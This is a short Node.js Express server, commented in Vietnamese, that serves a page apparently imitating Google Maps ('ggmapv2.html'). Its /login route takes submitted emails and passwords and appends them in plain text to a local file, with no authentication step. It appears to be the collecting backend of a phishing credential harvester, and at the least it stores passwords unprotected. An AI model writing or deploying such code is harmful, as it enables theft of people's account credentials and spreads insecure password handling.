const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path'); // thêm để dùng __dirname

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

// Phục vụ file HTML trong thư mục public
app.use(express.static(path.join(__dirname, 'public')));

// Nếu muốn trả trực tiếp file HTML ở route gốc
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ggmapv2.html'));
});

// API nhận login
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  const logEntry = `Email: ${email}, Password: ${password}\n`;

  // Ghi vào file login_data.txt
  fs.appendFile('login_data.txt', logEntry, (err) => {
    if (err) {
      console.error('Lỗi khi ghi file:', err);
      return res.status(500).json({ message: 'Lỗi server khi ghi file' });
    }

    console.log('Đã lưu thông tin vào file login_data.txt');
    res.json({ success: true, message: 'Đã nhận và lưu thông tin đăng nhập' });
  });
});

app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
